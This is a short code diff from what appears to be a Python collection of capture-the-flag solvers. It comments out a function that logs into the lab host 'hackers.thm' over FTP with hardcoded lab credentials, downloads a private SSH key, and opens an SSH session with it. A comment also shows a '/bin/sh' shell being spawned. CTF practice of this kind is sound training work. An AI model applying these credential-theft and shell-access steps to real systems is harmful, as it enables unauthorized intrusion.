@@ -135,17 +135,17 @@ def spaceJam():
 #     shell = req.process("/bin/sh")
 #     shell.interactive()
 
-def hackers():
-    global ip
-    username = "gcrawford"
-    password = "evelina"
-    passwd = "saturn1"
-    ftp_server = ftplib.FTP('hackers.thm', username, password)
-    ftp_server.encoding = 'utf-8'
-    with open("id_rsa", "wb") as f:
-        ftp_server.retrbinary(f"RETR id_rsa", f.write)
-    ftp_server.quit()
-    os.system("ssh -i id_rsa gcrawford@hackers.thm")
+#def hackers():
+#    global ip
+#    username = "gcrawford"
+#    password = "evelina"
+#    passwd = "saturn1"
+#    ftp_server = ftplib.FTP('hackers.thm', username, password)
+#    ftp_server.encoding = 'utf-8'
+#    with open("id_rsa", "wb") as f:
+#        ftp_server.retrbinary(f"RETR id_rsa", f.write)
+#    ftp_server.quit()
+#    os.system("ssh -i id_rsa gcrawford@hackers.thm")
 
 if __name__ == "__main__":
     
